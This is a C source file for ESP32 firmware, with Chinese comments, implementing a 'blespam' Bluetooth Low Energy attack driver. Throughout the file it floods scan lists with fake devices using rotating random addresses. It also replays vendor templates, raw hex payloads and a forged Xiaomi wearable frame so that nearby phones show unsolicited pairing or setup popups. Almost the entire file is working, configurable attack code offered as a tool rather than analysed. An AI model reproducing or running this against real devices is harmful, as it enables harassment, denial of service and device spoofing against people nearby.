// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// BLE 广播泛洪与弹窗模板。两种模式共用同一套轮换：停广播 → 换地址/换载荷 →
// 再开广播。控制器的随机地址在广播期间改不了，所以每轮都必须先停。
//
// 泛洪换的是地址和名称，目的是让扫描列表里出现大量"新设备"；弹窗换的是厂商
// 载荷，目的是让目标 OS 弹出配对/设置卡片。两者都不建立连接。
//
// 边界：经典 ESP32 只有 legacy 广播（AD 31 字节），C5 的扩展广播当前没开；
// 模板只要有一条渲染不进 31 字节就会被 test 命令拒绝，不允许静默截断。

#include "sdkconfig.h"

#if CONFIG_WB_BLE

#include <stdio.h>
#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "ble_frame/addr.h"
#include "ble_frame/adv.h"
#include "ble_frame/payload.h"
#include "esp_random.h"
#include "hal_ble/hal_ble.h"
#include "wbus/wbus.h"

#define OWNER "blespam"
#define DEFAULT_CYCLE_MS 50
#define DEFAULT_ITVL_MS 20
#define MAX_RAW_BYTES HAL_BLE_ADV_LEGACY_MAX

typedef enum { MODE_FLOOD = 0, MODE_POPUP, MODE_MIX, MODE_XIAOMI } spam_mode_t;
typedef enum { ROT_ADDR = 0, ROT_DATA, ROT_BOTH } rot_mode_t;

typedef struct {
    spam_mode_t mode;
    rot_mode_t rotate;
    bool connectable;
    uint16_t itvl;
    uint32_t cycle_ms;
    const bf_payload_t *tpl;
    uint8_t raw[MAX_RAW_BYTES];
    size_t raw_len;
    uint8_t fixed_addr[6];
    bool has_addr;
} spam_cfg_t;

static bool s_active;
static spam_cfg_t s_cfg;
static uint32_t s_last_ms;
static size_t s_cursor;
static uint32_t s_cycles;
static uint32_t s_cycle_err;
static uint32_t s_addr_rot;
static uint32_t s_data_rot;
static uint64_t s_entropy = 0x9E3779B97F4A7C15ULL;

static void blespam_stop(void);

static const char *mode_name(spam_mode_t mode) {
    switch (mode) {
        case MODE_POPUP:
            return "popup";
        case MODE_MIX:
            return "mix";
        case MODE_XIAOMI:
            return "xiaomi";
        default:
            return "flood";
    }
}

static const char *rotate_name(rot_mode_t rotate) {
    switch (rotate) {
        case ROT_DATA:
            return "data";
        case ROT_BOTH:
            return "both";
        default:
            return "addr";
    }
}

// 0.625ms 一格。规范下限 20ms；低于它会被抬到 HCI 下限，不静默接受。
static uint16_t ms_to_itvl(uint32_t ms) {
    uint32_t units = (ms * 1000u + 624u) / 625u;
    if (units < HAL_BLE_ITVL_HCI_MIN) {
        units = HAL_BLE_ITVL_HCI_MIN;
    }
    if (units > HAL_BLE_ITVL_MAX) {
        units = HAL_BLE_ITVL_MAX;
    }
    return (uint16_t)units;
}

static void random_static_addr(uint8_t out[6]) {
    // 混两路熵：esp_random 负责空口不可预测，LCG 负责同毫秒内也不同
    s_entropy = s_entropy * 6364136223846793005ULL + 1442695040888963407ULL;
    bf_addr_random_static(out, s_entropy ^ ((uint64_t)esp_random() << 21) ^ esp_random());
}

static int hex_nibble(char c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    }
    if (c >= 'a' && c <= 'f') {
        return c - 'a' + 10;
    }
    if (c >= 'A' && c <= 'F') {
        return c - 'A' + 10;
    }
    return -1;
}

static int hex_to_bytes(const char *text, uint8_t *out, size_t cap) {
    size_t n = 0;
    while (text[0] != 0) {
        if (text[1] == 0) {
            return -1;
        }
        const int hi = hex_nibble(text[0]);
        const int lo = hex_nibble(text[1]);
        if (hi < 0 || lo < 0 || n >= cap) {
            return -1;
        }
        out[n++] = (uint8_t)((hi << 4) | lo);
        text += 2;
    }
    return (int)n;
}

// 小米“眼镜/穿戴”帧：0x33 开头，PID 在 data[2..3]（FA 59 → 0x59FA），
// 01 后跟 6 字节 MAC 反序，尾部 08。广播地址必须与这 6 字节一致，
// 否则手机会按两台设备处理（解析器会因 MAC 不匹配直接丢弃）。
static const uint8_t kXiaomiHead[] = {0x02, 0x01, 0x08, 0x0e, 0x16, 0x95,
                                      0xfe, 0x33, 0x58, 0xfa, 0x59, 0x01};

// 组一轮广播串。返回 false 表示这组载荷放不进 legacy 31 字节，调用方报错。
static bool build_adv(const spam_cfg_t *cfg, size_t *cursor, uint8_t *adv, size_t *adv_len,
                      uint8_t *rsp, size_t *rsp_len, uint32_t seed, const uint8_t *mac) {
    *rsp_len = 0;
    if (cfg->raw_len > 0) {
        memcpy(adv, cfg->raw, cfg->raw_len);
        *adv_len = cfg->raw_len;
        return true;
    }
    if (cfg->mode == MODE_XIAOMI) {
        static const uint8_t kDummy[6] = {0xD2, 0x11, 0x22, 0x33, 0x44, 0x55};
        const uint8_t *src = (mac != NULL) ? mac : kDummy;
        memcpy(adv, kXiaomiHead, sizeof(kXiaomiHead));
        for (int i = 0; i < 6; i++) {
            adv[sizeof(kXiaomiHead) + i] = src[5 - i];
        }
        adv[sizeof(kXiaomiHead) + 6] = 0x08;
        *adv_len = sizeof(kXiaomiHead) + 7;
        return true;
    }
    if (cfg->mode == MODE_FLOOD) {
        bf_adv_t set;
        bf_adv_init(&set, adv, HAL_BLE_ADV_LEGACY_MAX);
        if (!bf_adv_flags(&set, BF_FLAG_GENERAL_DISC | BF_FLAG_NO_BREDR)) {
            return false;
        }
        char name[16];
        snprintf(name, sizeof(name), "BLE-%04X", (unsigned)(seed & 0xFFFFu));
        if (!bf_adv_name(&set, name, true)) {
            return false;
        }
        *adv_len = bf_adv_len(&set);
        return *adv_len > 0;
    }

    const bf_payload_t *tpl = cfg->tpl;
    if (cfg->mode == MODE_MIX) {
        const size_t count = bf_payload_count();
        if (count == 0) {
            return false;
        }
        tpl = bf_payload_at((*cursor) % count);
        (*cursor)++;
    }
    if (tpl == NULL) {
        return false;
    }

    if (tpl->scan_rsp) {
        bf_adv_t head;
        bf_adv_init(&head, adv, HAL_BLE_ADV_LEGACY_MAX);
        if (!bf_adv_flags(&head, BF_FLAG_GENERAL_DISC | BF_FLAG_NO_BREDR)) {
            return false;
        }
        *adv_len = bf_adv_len(&head);
        bf_adv_t body;
        bf_adv_init(&body, rsp, HAL_BLE_ADV_LEGACY_MAX);
        if (!bf_payload_render(tpl, &body)) {
            return false;
        }
        *rsp_len = bf_adv_len(&body);
        return *rsp_len > 0;
    }

    // 弹窗载荷本身就是满的 31 字节，没有 Flags 的位置；参考帧也没有 Flags。
    bf_adv_t set;
    bf_adv_init(&set, adv, HAL_BLE_ADV_LEGACY_MAX);
    if (!bf_payload_render(tpl, &set)) {
        return false;
    }
    *adv_len = bf_adv_len(&set);
    return *adv_len > 0;
}

static void rotate_once(uint32_t now_ms) {
    (void)now_ms;
    uint8_t addr[6];
    const uint8_t *addr_ptr = NULL;
    if (s_cfg.has_addr) {
        memcpy(addr, s_cfg.fixed_addr, 6);
        addr_ptr = addr;
    } else if (s_cfg.rotate == ROT_ADDR || s_cfg.rotate == ROT_BOTH ||
               s_cfg.mode == MODE_XIAOMI) {
        // 小米帧要求地址与载荷里的 MAC 一致，所以每轮都必须换地址时一起换
        random_static_addr(addr);
        addr_ptr = addr;
    }

    uint8_t adv[HAL_BLE_ADV_EXT_MAX];
    uint8_t rsp[HAL_BLE_ADV_EXT_MAX];
    size_t adv_len = 0;
    size_t rsp_len = 0;
    if (!build_adv(&s_cfg, &s_cursor, adv, &adv_len, rsp, &rsp_len, esp_random(), addr_ptr)) {
        s_cycle_err++;
        return;
    }

    const hal_ble_adv_cycle_t cycle = {
        .addr = addr_ptr,
        .adv = adv,
        .adv_len = adv_len,
        .rsp = (rsp_len > 0) ? rsp : NULL,
        .rsp_len = rsp_len,
        .itvl = s_cfg.itvl,
        .connectable = s_cfg.connectable,
    };
    uint32_t took_us = 0;
    if (hal_ble_adv_cycle(&cycle, &took_us) != ESP_OK) {
        s_cycle_err++;
        return;
    }
    s_cycles++;
    s_data_rot++;
    if (addr_ptr != NULL) {
        s_addr_rot++;
    }
}

static void blespam_tick(uint32_t now_ms) {
    if (!s_active) {
        return;
    }
    if (s_last_ms != 0 && (now_ms - s_last_ms) < s_cfg.cycle_ms) {
        return;
    }
    // now_ms 在开机头 50ms 内可能是 0，用 1 当哨兵，避免被当成"还没打过点"
    s_last_ms = (now_ms == 0) ? 1 : now_ms;
    rotate_once(now_ms);
}

static esp_err_t parse_cfg(wb_args_t *args, spam_cfg_t *cfg, wb_reply_t *reply) {
    memset(cfg, 0, sizeof(*cfg));
    cfg->connectable = true;

    const char *mode = wb_args_str(args, "mode");
    if (mode[0] == 0 || strcmp(mode, "flood") == 0) {
        cfg->mode = MODE_FLOOD;
    } else if (strcmp(mode, "popup") == 0) {
        cfg->mode = MODE_POPUP;
    } else if (strcmp(mode, "mix") == 0) {
        cfg->mode = MODE_MIX;
    } else if (strcmp(mode, "xiaomi") == 0) {
        cfg->mode = MODE_XIAOMI;
    } else {
        wb_reply_fail(reply, "mode 要是 flood / popup / mix");
        return ESP_ERR_INVALID_ARG;
    }

    const char *rotate = wb_args_str(args, "rotate");
    if (rotate[0] == 0) {
        // 默认两种模式都换地址：手机上"没见过的设备"才会重新弹卡片；
        // 要测固定地址就显式 rotate=data。
        cfg->rotate = ROT_ADDR;
    } else if (strcmp(rotate, "addr") == 0) {
        cfg->rotate = ROT_ADDR;
    } else if (strcmp(rotate, "data") == 0) {
        cfg->rotate = ROT_DATA;
    } else if (strcmp(rotate, "both") == 0) {
        cfg->rotate = ROT_BOTH;
    } else {
        wb_reply_fail(reply, "rotate 要是 addr / data / both");
        return ESP_ERR_INVALID_ARG;
    }

    const uint32_t itvl_ms = wb_args_u32(args, "itvl");
    cfg->itvl = ms_to_itvl(itvl_ms == 0 ? DEFAULT_ITVL_MS : itvl_ms);
    cfg->cycle_ms = wb_args_u32(args, "cycle");
    if (cfg->cycle_ms == 0) {
        cfg->cycle_ms = DEFAULT_CYCLE_MS;
    }
    cfg->connectable = wb_args_bool(args, "connect");

    // 固定广播地址：回放厂商载荷时，载荷里的 MAC 和广播地址必须能对上，
    // 否则手机侧会把它们当成两台不同的设备。控制器只认 random static，
    // 最高两位强制置 11，回执里要打印实际生效的值。
    const char *addr_text = wb_args_str(args, "addr");
    if (addr_text[0] != 0 && strcmp(addr_text, "random") != 0) {
        if (!bf_addr_parse(addr_text, cfg->fixed_addr)) {
            wb_reply_fail(reply, "addr 要是 random 或 aa:bb:cc:dd:ee:ff");
            return ESP_ERR_INVALID_ARG;
        }
        cfg->fixed_addr[0] = (uint8_t)(cfg->fixed_addr[0] | 0xC0);
        cfg->has_addr = true;
    }

    const char *tpl_name = wb_args_str(args, "template");
    const char *raw = wb_args_str(args, "raw");
    if (raw[0] != 0 && tpl_name[0] != 0) {
        wb_reply_fail(reply, "raw 和 template 只能给一个");
        return ESP_ERR_INVALID_ARG;
    }
    if (raw[0] != 0) {
        const int n = hex_to_bytes(raw, cfg->raw, sizeof(cfg->raw));
        if (n <= 0) {
            wb_reply_fail(reply, "raw 要是偶数长度的十六进制串，且不超过 31 字节");
            return ESP_ERR_INVALID_ARG;
        }
        cfg->raw_len = (size_t)n;
    }
    if (cfg->mode == MODE_POPUP || cfg->mode == MODE_MIX) {
        if (tpl_name[0] == 0) {
            cfg->tpl = bf_payload_at(0);
        } else {
            cfg->tpl = bf_payload_find(tpl_name);
        }
        if (cfg->tpl == NULL && cfg->raw_len == 0) {
            wb_reply_fail(reply, "template 不认识，先看 blespam.list");
            return ESP_ERR_INVALID_ARG;
        }
    }
    return ESP_OK;
}

static esp_err_t blespam_start(wb_args_t *args, wb_reply_t *reply) {
    spam_cfg_t cfg;
    const esp_err_t err = parse_cfg(args, &cfg, reply);
    if (err != ESP_OK) {
        return err;
    }
    if (hal_ble_gatt_connected()) {
        // 控制器只允许一个连接（BTDM_CTRL_BLE_MAX_CONN=1），连着手机时再开
        // 可连接广播会被控制器拒绝；先让操作者断开，别给一个含糊的 last_rc。
        wb_reply_fail(reply, "手机还连着 BLE 控制通道，先断开再启动");
        return ESP_ERR_INVALID_STATE;
    }

    attack_exclusive();
    // GATT 控制通道和攻击抢同一份广播。控制通道是辅助功能，攻击优先，
    // 回执里说明被顶掉的是谁；stop 之后由 BLE 传输插件重新拉起。
    const char *previous = hal_ble_adv_preempt(OWNER);
    hal_ble_adv_stop();

    s_cfg = cfg;
    s_cursor = 0;
    s_cycles = 0;
    s_cycle_err = 0;
    s_addr_rot = 0;
    s_data_rot = 0;
    s_last_ms = attack_now_ms();
    s_active = true;

    rotate_once(attack_now_ms());
    if (s_cycles == 0) {
        blespam_stop();
        hal_ble_stats_t stats;
        hal_ble_stats(&stats);
        wb_reply_fail(reply, "第一次广播没起来（last_rc=%d）", (int)stats.last_rc);
        return ESP_FAIL;
    }

    attack_mark_start();
    attack_emit("blespam", true, "mode=%s", mode_name(cfg.mode));
    wb_reply_line(reply, "blespam 开跑 mode=%s rotate=%s cycle=%ums itvl=%u.%ums connect=%d",
                  mode_name(cfg.mode), rotate_name(cfg.rotate), (unsigned)cfg.cycle_ms,
                  (unsigned)((cfg.itvl * 625u) / 1000u), (unsigned)((cfg.itvl * 625u / 100u) % 10u),
                  cfg.connectable ? 1 : 0);
    if (cfg.has_addr) {
        wb_reply_line(reply, "addr=%02x:%02x:%02x:%02x:%02x:%02x", cfg.fixed_addr[0],
                      cfg.fixed_addr[1], cfg.fixed_addr[2], cfg.fixed_addr[3], cfg.fixed_addr[4],
                      cfg.fixed_addr[5]);
    }
    if (previous != NULL && strcmp(previous, OWNER) != 0) {
        wb_reply_line(reply, "广播占用者 %s 已让位，stop 后由 GATT 插件重新拉起", previous);
    }
    return ESP_OK;
}

static void blespam_stop(void) {
    if (s_active) {
        s_active = false;
        hal_ble_adv_stop();
        attack_emit("blespam", false, NULL);
    }
    // 抢占期间占用者一直是 blespam；停的时候无条件还回去
    hal_ble_adv_release(OWNER);
}

static esp_err_t blespam_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t cycles = s_cycles;
    const uint32_t errors = s_cycle_err;
    const uint32_t addr_rot = s_addr_rot;
    const uint32_t data_rot = s_data_rot;
    blespam_stop();
    attack_report_rate(reply, "blespam", cycles);
    wb_reply_line(reply, "cycles=%u cycle_err=%u addr_rot=%u data_rot=%u", (unsigned)cycles,
                  (unsigned)errors, (unsigned)addr_rot, (unsigned)data_rot);
    return ESP_OK;
}

static esp_err_t blespam_test(wb_args_t *args, wb_reply_t *reply) {
    spam_cfg_t cfg;
    const esp_err_t err = parse_cfg(args, &cfg, reply);
    if (err != ESP_OK) {
        return err;
    }
    uint8_t adv[HAL_BLE_ADV_EXT_MAX];
    uint8_t rsp[HAL_BLE_ADV_EXT_MAX];
    size_t adv_len = 0;
    size_t rsp_len = 0;
    size_t cursor = 0;
    if (!build_adv(&cfg, &cursor, adv, &adv_len, rsp, &rsp_len, 0xB1E5u,
                   cfg.has_addr ? cfg.fixed_addr : NULL)) {
        wb_reply_fail(reply, "这组载荷放不进 31 字节广播");
        return ESP_FAIL;
    }
    char hex[HAL_BLE_ADV_EXT_MAX * 2 + 1];
    bf_hex(adv, adv_len, hex, sizeof(hex));
    wb_reply_line(reply, "adv len=%u hex=%s", (unsigned)adv_len, hex);
    if (rsp_len > 0) {
        bf_hex(rsp, rsp_len, hex, sizeof(hex));
        wb_reply_line(reply, "rsp len=%u hex=%s", (unsigned)rsp_len, hex);
    }
    return ESP_OK;
}

static esp_err_t blespam_list(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    wb_reply_line(reply, "templates n=%u", (unsigned)bf_payload_count());
    for (size_t i = 0; i < bf_payload_count(); i++) {
        const bf_payload_t *tpl = bf_payload_at(i);
        if (tpl == NULL) {
            break;
        }
        const char *container = (tpl->service_uuid != 0) ? "service16" : "mfr";
        wb_reply_line(reply, "%s platform=%s container=%s body=%u %s connect=%d", tpl->name,
                      bf_platform_name(tpl->platform), container, (unsigned)tpl->body_len,
                      tpl->scan_rsp ? "scan_rsp" : "adv", tpl->connectable ? 1 : 0);
    }
    return ESP_OK;
}

static uint32_t blespam_frames(void) {
    return s_cycles;
}

static bool blespam_active(void) {
    return s_active;
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "mode", .type = WB_T_STR, .required = false, .def_str = "flood"},
    {.name = "template", .type = WB_T_STR, .required = false},
    {.name = "raw", .type = WB_T_STR, .required = false},
    {.name = "itvl", .type = WB_T_U32, .required = false, .min = 20, .max = 10240, .def = 20},
    {.name = "cycle", .type = WB_T_U32, .required = false, .min = 20, .max = 1000, .def = 50},
    {.name = "rotate", .type = WB_T_STR, .required = false},
    {.name = "addr", .type = WB_T_STR, .required = false},
    {.name = "connect", .type = WB_T_BOOL, .required = false, .def = 1},
};

static const wb_policy_t kTestPolicy[] = {
    {.name = "mode", .type = WB_T_STR, .required = false, .def_str = "flood"},
    {.name = "template", .type = WB_T_STR, .required = false},
    {.name = "raw", .type = WB_T_STR, .required = false},
    {.name = "itvl", .type = WB_T_U32, .required = false, .min = 20, .max = 10240, .def = 20},
    {.name = "cycle", .type = WB_T_U32, .required = false, .min = 20, .max = 1000, .def = 50},
    {.name = "rotate", .type = WB_T_STR, .required = false},
    {.name = "connect", .type = WB_T_BOOL, .required = false, .def = 1},
};

static const wb_method_t kMethods[] = {
    {"start", blespam_start, "[mode=flood|popup|mix|xiaomi] [template=x] [raw=hex] [addr=mac] [itvl=20] [cycle=50] [rotate=addr|data|both] [connect=1]",
     kStartPolicy, sizeof(kStartPolicy) / sizeof(kStartPolicy[0])},
    {"stop", blespam_stop_cmd, "", NULL, 0},
    {"test", blespam_test, "[mode=...] [template=x] [raw=hex]", kTestPolicy,
     sizeof(kTestPolicy) / sizeof(kTestPolicy[0])},
    {"list", blespam_list, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "blespam",
    .title = "BLE Spam",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static const attack_driver_t kDriver = {
    .name = "blespam",
    .object = &kObject,
    .stop = blespam_stop,
    .tick = blespam_tick,
    .frames = blespam_frames,
    .active = blespam_active,
};

const attack_driver_t *blespam_attack(void) {
    return &kDriver;
}

#else

const attack_driver_t *blespam_attack(void) {
    return NULL;
}

#endif
